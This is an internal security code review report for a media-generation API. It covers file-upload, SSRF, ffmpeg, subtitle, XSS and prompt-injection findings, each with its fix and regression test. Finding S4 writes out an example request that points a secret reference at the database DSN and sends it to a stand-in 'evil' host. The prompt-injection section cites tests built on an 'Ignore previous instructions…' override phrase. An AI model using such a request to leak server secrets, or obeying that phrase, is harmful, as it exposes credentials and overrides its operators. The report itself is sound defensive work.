# ACS-101 — Security code review: file upload, SSRF, FFmpeg, subtitles, prompt injection

Date: 2026-10-19 · Branch `feat/mvp-impl` · Scope: `api/` (code review plus regression tests). Checklist: SPEC-02 §5.6 and §7.
Companion report: [rbac-idor-report.md](rbac-idor-report.md) (ACS-100).

**Summary:** 10 findings (0 high, 4 medium, 6 low) plus 1 high-severity authorization defect found by the IDOR tests (ACS-100 report, finding 1).

- Fixed with tests: 9.
- Accepted or partially mitigated: 2, listed under [open items](#open-items--recommendations).

## Findings

| # | Area | Sev. | Finding | Fix | Status |
|---|---|---|---|---|---|
| S1 | File upload | Medium | **The content of a verified file could be swapped.** The presigned PUT stays valid for up to 15 minutes. `POST /files/{id}/complete` checked the object once, marked it ready, and every reader then used the same key. Re-PUTting different bytes (same length and Content-Type) after `/complete` would feed unverified bytes to workers (ffmpeg, kenburns, image edit) and to downloads. | `CompleteUpload` now downloads the object **once** into a private temp file (0600), runs every check on those bytes (magic bytes, dimensions, ffprobe), and uploads exactly those bytes to a new key `files/YYYY/MM/<id>`. `MarkFileReady` stores that key and the `uploads/…` key is deleted. Readers never touch the browser-writable key. Files: `file/usecase/service.go` (`verify`), `file/adapter/postgres/queries.sql` (`storage_key`). Test: `TestCompletePinsVerifiedBytes`. | Fixed |
| S2 | File upload | Medium | **Decompression bomb.** Image dimensions were read but not limited, so a small PNG declaring 60000×60000 passed and was decoded at full size by ffmpeg/kenburns, exhausting worker memory. | `measureImage` rejects width or height > 8192 or more than 40 MP with `413 FILE_TOO_LARGE` (`dimensions_too_large`). The object is deleted and the file marked rejected. Test: `TestCompleteRejectsOversizedImageDimensions`. | Fixed |
| S3 | File upload | Medium | **SVG logos were served inline.** An SVG with `<script>` opened from a signed URL executes on the storage origin. If that origin shares a parent domain with the app (`COOKIE_DOMAIN`), the script can read the CSRF cookie. | `Files.SignedURL` always signs `image/svg+xml`, HTML and XML as `Content-Disposition: attachment`. `<img src>` still renders the logo. Test: `TestSignedURLForcesAttachmentForSVG`. | Fixed (see R2) |
| S4 | Secrets / SSRF | Medium | **An Admin could send any server env var to any HTTPS host.** `secret_ref` accepted any upper-case name and `base_url` any https host, so `{"secret_ref":"DATABASE_URL","config_json":{"base_url":"https://evil"}}` would send the DSN as an API key. | `config.Secret` resolves only provider credential names (`…_API_KEY`, `…_CREDENTIALS`, `…_TOKEN`), never platform prefixes (`DATABASE_`, `REDIS_`, `S3_`, `SMTP_`, `SESSION_`, `COOKIE_`, `CSRF_`, `APP_`, `ACS_`). `provider/domain.ValidateSecretRef` rejects other names with `not_a_provider_secret`. Tests: `TestSecretOnlyResolvesProviderCredentials`, `TestSecretRefAndConfig`. | Fixed (residual: R3) |
| S5 | SSRF | Low-Med | **Vendor redirects followed to any host with the API key.** Go strips only `Authorization`/`Cookie` across hosts, so `x-goog-api-key` (Veo download) would follow a redirect to an internal or foreign host. | `vendorhttp.SafeRedirect` is now the `CheckRedirect` of every vendor client: https only, at most 3 hops, all headers dropped when the host changes. Test: `TestSafeRedirect`. | Fixed |
| S6 | FFmpeg | Low-Med | **ffmpeg/ffprobe accepted any input protocol.** A crafted "image" or "clip" holding an HLS or ffconcat playlist could make ffmpeg open URLs or other protocols. | `ffmpeg.Harden` (applied to every Normalize/StillToClip/Render/Thumbnail run) adds `-nostdin` and `-protocol_whitelist file` before every file input; lavfi sources need none. `ProbeArgs` adds `-protocol_whitelist file`. Nested playlist entries inherit the whitelist. Real-ffmpeg render tests pass with it. Test: `TestHardenRestrictsInputProtocols`. | Fixed |
| S7 | File upload / DoS | Low | **ffprobe on uploads ran without a time bound** in the API process. | Probe bounded at 60 s (`probeTimeout`). It still runs in the API process (R4). | Partially fixed |
| S8 | Subtitles | Low | **SRT cue text was written raw.** `<font>`/`<b>` tags and `{\an8}` override blocks were honoured by SRT renderers and by ffmpeg's srt→mov_text conversion. Control and bidi-override characters were kept, and one long unbroken "word" became an off-screen cue. (ASS was already escaped. `-->` cannot form a timing line because cues are single-line.) | `srtEscape`: `< >` → `‹ ›`, `{ }` → `( )`. `cleanSubtitleText` (SRT and ASS): drops C0/C1 controls and U+202A–202E, U+2066–2069, LRM/RLM, and turns CR/LF/TAB into spaces. `splitLongWords` hard-splits words longer than 42 runes. Vietnamese diacritics are preserved. Test: `TestSubtitleSpecialCharacters` (plus the existing `TestASSEscapesUserText`). | Fixed |
| S9 | Downloads | Low | **Download name extension came from the uploader's filename** (a PNG uploaded as `x.html` downloaded as `.html`), and the 80-character cap did nothing (`break` inside `switch`). | The extension comes from the verified MIME type; the original extension is a fallback for unknown types only, and only if alphanumeric. The cap now works. (Header injection was already impossible: `url.PathEscape`.) Test: `TestDownloadName`. | Fixed |
| S10 | Content / XSS | Low (latent) | **`body_html` from the browser was stored as-is** on manual revisions (`POST /assets/{id}/versions`). The web app does not render it today, but any export, e-mail or future renderer would be stored XSS. | For content assets, `asset/domain.SanitizeContentBody` regenerates `body_html` from `body_text` (escaped `<p>`/`<br>`, same markup as `content/domain.RenderHTML`). Without `body_text`, the client HTML is reduced to escaped text. Test: `TestSanitizeContentBody`. | Fixed |

## Checked and found OK

- **Upload policy:** presigned PUT binds Content-Type and Content-Length. `/complete` re-checks the stored size against the declared size and the per-purpose limit. The purpose ↔ MIME allowlist applies, magic bytes are compared with the declared type, and the owner check returns 404 to others (`file/usecase/service.go` `owned`). Generated files are written only through `Files.Store` (source `generated`/`rendered`).
- **SSRF:** no endpoint accepts a URL from the user. Every `*url` field in DTOs is a response field. Workers load inputs only through `Files.Open` (object storage). OpenAI images arrive base64-encoded, never by URL. Veo download URIs must match the configured Gemini host (`veo.sameHost`). ffprobe on uploads reads a private temp file, not a URL. Vendor `base_url` must be https.
- **FFmpeg (SPEC-02 §5.6):** `exec.CommandContext` with argument vectors only, no shell. No user text in filter graphs (no `drawtext`). Subtitles are burned in from an escaped ASS file. Subtitle and fonts paths with filter metacharacters `' : , ; [ ] \ =` or newlines are refused. Option-like sources (leading `-`) are refused, and ffprobe uses `--`. Each step has its own `MkdirTemp` work dir, removed afterwards, and the job engine applies a per-step timeout. The render container (`deploy/Dockerfile.render`) runs non-root with CPU/RAM limits and a tmpfs work dir. Kenburns IDs are UUID-validated.
- **Prompt injection:** content templates keep the system instruction separate. All user and brief data is JSON-encoded inside `<user_data>` with `<`/`>` escaped, so it cannot close the tag. Brand values in the system section are single-line, have `<>` removed and are capped at 200 characters. Prompt-builder and use-case tests cover an "Ignore previous instructions…" reference text (`prompt/builder_test.go`, `usecase/service_test.go`). Video script/storyboard prompts JSON-encode user data. Model output is never executed and never used as a path or ffmpeg argument. Structured output is validated: `NormalizeStoryboard` caps scene count, durations and text length; content variants are normalised. Post-generation checks flag `unverified_claim` (money or % not in the facts) and `forbidden_word`.
- **HTTP layer:** `httpx.Decode` caps JSON bodies at 1 MB and rejects unknown fields and non-JSON content types. CSRF double-submit applies on every unsafe authenticated route except login (now tested on all routes: `TestCSRFRequiredOnEveryUnsafeRoute`). The access log redacts `X-Amz-Signature` and cookies. Vendor error snippets redact `key=`.
- **AuthZ:** see the ACS-100 report (RBAC matrix over all 90 routes; 35 IDOR cases).

## Open items / recommendations

| # | Item | Why not now |
|---|---|---|
| R1 | A user can still re-PUT to their own presigned URL within its 15-minute TTL after `/complete`. The object lands under the deleted `uploads/…` key, which nothing reads; it is storage litter, bounded by the declared size. Add a bucket lifecycle rule that expires `uploads/` after 1 day. | Ops (bucket policy), not code. |
| R2 | Serve the bucket from a dedicated host (not a sibling of the app domain) and leave `COOKIE_DOMAIN` empty in production. Optionally add `Content-Security-Policy: sandbox` on the bucket (MinIO/S3 response headers). | Deployment config. |
| R3 | `base_url` still accepts any https host. After S4 an Admin can only send provider keys there, so the risk is limited to the trusted Admin role. Consider a per-provider host allowlist. | Needs a product decision on self-hosted gateways. |
| R4 | Move upload ffprobe into a worker job (or add a per-user rate limit on `/files/{id}/complete`) so large videos cannot tie up API CPU and disk. | Larger change; S7 bounds a single probe. |
| R5 | `mail.SMTP.Send` (budget alerts) has no dial/IO timeout (`net/smtp.SendMail`). A hung relay blocks the `budget-alert-mail` runner (other runners are unaffected). | Low impact; worth a follow-up. |
